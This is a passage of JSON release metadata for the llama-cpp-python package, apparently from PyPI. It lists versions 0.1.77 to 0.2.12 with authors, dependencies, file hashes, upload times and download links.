3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.77/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.77","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"28576db0db4582e31ced78487c6f28a4ee127fe38a22a85c573c39c7e5a03e2f","md5":"6054d5b5951893175987d4afeaf0e216","sha256":"76c7fae8f5386edecf38cb149bf119127e1208883f0456c6998465648d6c242e"},"downloads":-1,"filename":"llama_cpp_python-0.1.77.tar.gz","has_sig":false,"md5_digest":"6054d5b5951893175987d4afeaf0e216","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1624776,"upload_time":"2023-07-24T18:30:35","upload_time_iso_8601":"2023-07-24T18:30:35.309085Z","url":"https://files.pythonhosted.org/packages/28/57/6db0db4582e31ced78487c6f28a4ee127fe38a22a85c573c39c7e5a03e2f/llama_cpp_python-0.1.77.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.78":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.78/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.78","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"dd983d2382ac0b462b175519de360c57d514fbe5d33a5e67e42e82dc03bfb0f9","md5":"c8f5f60ea28df81666a2bbd15af6ac6e","sha256":"cffdcbc4b5fca2bceb1f6bf3590460ebc898c69295a02439dfc6327566e10367"},"downloads":-1,"filename":"llama_cpp_python-0.1.78.tar.gz","has_sig":false,"md5_digest":"c8f5f60ea28df81666a2bbd15af6ac6e","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1693367,"upload_time":"2023-08-18T03:19:38","upload_time_iso_8601":"2023-08-18T03:19:38.016527Z","url":"https://files.pythonhosted.org/packages/dd/98/3d2382ac0b462b175519de360c57d514fbe5d33a5e67e42e82dc03bfb0f9/llama_cpp_python-0.1.78.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.79":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.79/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.79","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"f28539c90a6b2306fbf91fc9dd2346bb4599c57e5c29aec15981fe5d662cef34","md5":"44516661847a56bb477bcb07e06b6843","sha256":"4000b490da8f0e1637230ee66221a7f8426914c8188ad49996a4212d5391c0bc"},"downloads":-1,"filename":"llama_cpp_python-0.1.79.tar.gz","has_sig":false,"md5_digest":"44516661847a56bb477bcb07e06b6843","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1764286,"upload_time":"2023-08-25T19:19:43","upload_time_iso_8601":"2023-08-25T19:19:43.580152Z","url":"https://files.pythonhosted.org/packages/f2/85/39c90a6b2306fbf91fc9dd2346bb4599c57e5c29aec15981fe5d662cef34/llama_cpp_python-0.1.79.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.8":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.8/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.8","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"7e3bb5f7e1ec5f43a4e980733c63bd4f05e1b7e14fd3b7aa72d9ca91f2415323","md5":"ba73bfa9993e8d125cba1c45fda23922","sha256":"7836133eb0b9ca821a9016412597aab06da1be822213c9b2fc5a87c5dfa5da38"},"downloads":-1,"filename":"llama_cpp_python-0.1.8.tar.gz","has_sig":false,"md5_digest":"ba73bfa9993e8d125cba1c45fda23922","packagetype":"sdist","python_version":"source","requires_python":null,"size":516108,"upload_time":"2023-03-28T08:04:49","upload_time_iso_8601":"2023-03-28T08:04:49.905214Z","url":"https://files.pythonhosted.org/packages/7e/3b/b5f7e1ec5f43a4e980733c63bd4f05e1b7e14fd3b7aa72d9ca91f2415323/llama_cpp_python-0.1.8.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.80":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.80/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.80","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"afc7e3cee337dc44024bece8faf7683e40d015bae55b0dfaddd1a97ab4d1b432","md5":"a4e672a774067428c3adf2140f81a9dd","sha256":"1c734483f41053212e1f3d68503763b5cef3213923f058fbabb58fb7b4df1d7b"},"downloads":-1,"filename":"llama_cpp_python-0.1.80.tar.gz","has_sig":false,"md5_digest":"a4e672a774067428c3adf2140f81a9dd","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1774954,"upload_time":"2023-08-27T03:43:08","upload_time_iso_8601":"2023-08-27T03:43:08.759138Z","url":"https://files.pythonhosted.org/packages/af/c7/e3cee337dc44024bece8faf7683e40d015bae55b0dfaddd1a97ab4d1b432/llama_cpp_python-0.1.80.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.81":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.81/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.81","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"ae92c10ee59095bc1336edbecc8f6eea98d9d2f4df1d944b9df9b4484ea268ae","md5":"abd7c48ddd6251a6906ff3c53a4965a2","sha256":"8b8fa42e41c6334efe056571b5f19056ffd9776b94ee152530e1fb9fe81deda2"},"downloads":-1,"filename":"llama_cpp_python-0.1.81.tar.gz","has_sig":false,"md5_digest":"abd7c48ddd6251a6906ff3c53a4965a2","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1780688,"upload_time":"2023-08-27T17:04:43","upload_time_iso_8601":"2023-08-27T17:04:43.715735Z","url":"https://files.pythonhosted.org/packages/ae/92/c10ee59095bc1336edbecc8f6eea98d9d2f4df1d944b9df9b4484ea268ae/llama_cpp_python-0.1.81.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.82":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.82/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.82","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"81b5b63dbe0b799b9063208543a84b0e99b622f8a8d19de9564fc1d2877e1c9e","md5":"6d8fd227887fa6e657879b77a8bae666","sha256":"ea19ee012042d806df09a5db638a912c11eed92929a27a4b3fb1d35ab7758974"},"downloads":-1,"filename":"llama_cpp_python-0.1.82.tar.gz","has_sig":false,"md5_digest":"6d8fd227887fa6e657879b77a8bae666","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1781388,"upload_time":"2023-08-28T15:18:25","upload_time_iso_8601":"2023-08-28T15:18:25.457124Z","url":"https://files.pythonhosted.org/packages/81/b5/b63dbe0b799b9063208543a84b0e99b622f8a8d19de9564fc1d2877e1c9e/llama_cpp_python-0.1.82.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.83":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.83/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.83","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"6ec7651fa47b77d2189a46b00caa44627d17476bf41bcbeb0b72906295d6de79","md5":"076f3ed93081586db0bceb02ec9a4240","sha256":"9f40656e46a85a3c3427790246e03490bb90202c37cb99732a095ffcb99efe54"},"downloads":-1,"filename":"llama_cpp_python-0.1.83.tar.gz","has_sig":false,"md5_digest":"076f3ed93081586db0bceb02ec9a4240","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1788530,"upload_time":"2023-08-29T22:10:56","upload_time_iso_8601":"2023-08-29T22:10:56.311999Z","url":"https://files.pythonhosted.org/packages/6e/c7/651fa47b77d2189a46b00caa44627d17476bf41bcbeb0b72906295d6de79/llama_cpp_python-0.1.83.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.84":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.84/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\""],"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.84","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"39f2a64d37bdaecb2ad66cfc2faab95201acf66b537affbd042656b27dc135f4","md5":"3ddbb8b7f16defe567be05daa396b640","sha256":"8840bfa90acfdd80486e3c11393fe6ff6841598f03278bdf3502e2d901978f13"},"downloads":-1,"filename":"llama_cpp_python-0.1.84.tar.gz","has_sig":false,"md5_digest":"3ddbb8b7f16defe567be05daa396b640","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1801512,"upload_time":"2023-09-09T16:20:10","upload_time_iso_8601":"2023-09-09T16:20:10.953416Z","url":"https://files.pythonhosted.org/packages/39/f2/a64d37bdaecb2ad66cfc2faab95201acf66b537affbd042656b27dc135f4/llama_cpp_python-0.1.84.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.85":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.85/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\""],"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.85","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"edf22fb3b4c3886de5d1bcfbd258932159e374d1d9a0d52d6850805e26cc9fc2","md5":"750aed1643f54643301c57c06e053a56","sha256":"9ad2269f47a5fac10e78565e0b4078ea6b8d56ddd3b78892967da4739684db2b"},"downloads":-1,"filename":"llama_cpp_python-0.1.85.tar.gz","has_sig":false,"md5_digest":"750aed1643f54643301c57c06e053a56","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1802346,"upload_time":"2023-09-12T20:19:21","upload_time_iso_8601":"2023-09-12T20:19:21.443248Z","url":"https://files.pythonhosted.org/packages/ed/f2/2fb3b4c3886de5d1bcfbd258932159e374d1d9a0d52d6850805e26cc9fc2/llama_cpp_python-0.1.85.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.9":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.9/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.9","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"9f2445a5a3beee1354f668d916eb1a2146835a0eda4dbad0da45252170e105a6","md5":"6b5d0b7e446ebceb48abc8563dea08d0","sha256":"157439f8bb0073ae8d7e132833d8f9d52106bcb6b62b2ac264cb728814205f0c"},"downloads":-1,"filename":"llama_cpp_python-0.1.9.tar.gz","has_sig":false,"md5_digest":"6b5d0b7e446ebceb48abc8563dea08d0","packagetype":"sdist","python_version":"source","requires_python":null,"size":516204,"upload_time":"2023-03-28T09:00:51","upload_time_iso_8601":"2023-03-28T09:00:51.667687Z","url":"https://files.pythonhosted.org/packages/9f/24/45a5a3beee1354f668d916eb1a2146835a0eda4dbad0da45252170e105a6/llama_cpp_python-0.1.9.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.0":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":[],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.0/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.0","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"5ba6a49b40d4c0ac9aa703bf11e5783d38beb3924a6ba5165a393518646894c9","md5":"0aca60963b8726c54c90a1e6fb2ed551","sha256":"5e169b3eef61f8c1f031587ac263449fb69d7a13f17a828f3d665d3aa55dc3d2"},"downloads":-1,"filename":"llama_cpp_python-0.2.0.tar.gz","has_sig":false,"md5_digest":"0aca60963b8726c54c90a1e6fb2ed551","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":1528959,"upload_time":"2023-09-12T23:07:22","upload_time_iso_8601":"2023-09-12T23:07:22.665723Z","url":"https://files.pythonhosted.org/packages/5b/a6/a49b40d4c0ac9aa703bf11e5783d38beb3924a6ba5165a393518646894c9/llama_cpp_python-0.2.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.1":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.1/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.1","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"e43a7c65dbed3913086ec0a84549acdd4002ef4e1ef9fbb1d31596a4c1fd64a3","md5":"667132adf0cf3e227f9b462dc132ae5a","sha256":"471b1a6306a70d4813717d81061f95b6efd40582e8b85080c7d8dbfd191cf1d7"},"downloads":-1,"filename":"llama_cpp_python-0.2.1.tar.gz","has_sig":false,"md5_digest":"667132adf0cf3e227f9b462dc132ae5a","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":1529076,"upload_time":"2023-09-13T01:03:17","upload_time_iso_8601":"2023-09-13T01:03:17.521898Z","url":"https://files.pythonhosted.org/packages/e4/3a/7c65dbed3913086ec0a84549acdd4002ef4e1ef9fbb1d31596a4c1fd64a3/llama_cpp_python-0.2.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.10":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.10/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.10","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"d4a2ff96c80f91d7d534a6b65517247c09680b1bbf064d6388feda9aac3201dd","md5":"74ce1bbe9578bc194928b1b064cec144","sha256":"f99cf21568c565a1d941ad9a90d874dd0dd7b2e63499c7036c234d2f16b8d1e9"},"downloads":-1,"filename":"llama_cpp_python-0.2.10.tar.gz","has_sig":false,"md5_digest":"74ce1bbe9578bc194928b1b064cec144","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":3555779,"upload_time":"2023-09-30T17:25:57","upload_time_iso_8601":"2023-09-30T17:25:57.723031Z","url":"https://files.pythonhosted.org/packages/d4/a2/ff96c80f91d7d534a6b65517247c09680b1bbf064d6388feda9aac3201dd/llama_cpp_python-0.2.10.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.11":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.11/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.11","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"5bb91ea446f1dcccb13313ea1e651c73bd5cc4db2aabf6cae1894064bddf1fc4","md5":"4bc15998a428a0aa643c526410a5d9f0","sha256":"aae4820bb24aca61800bac771fb735dcc22b08c1374300782ab47eb65743723a"},"downloads":-1,"filename":"llama_cpp_python-0.2.11.tar.gz","has_sig":false,"md5_digest":"4bc15998a428a0aa643c526410a5d9f0","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":3555923,"upload_time":"2023-09-30T20:08:47","upload_time_iso_8601":"2023-09-30T20:08:47.411621Z","url":"https://files.pythonhosted.org/packages/5b/b9/1ea446f1dcccb13313ea1e651c73bd5cc4db2aabf6cae1894064bddf1fc4/llama_cpp_python-0.2.11.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.12":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.12/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == 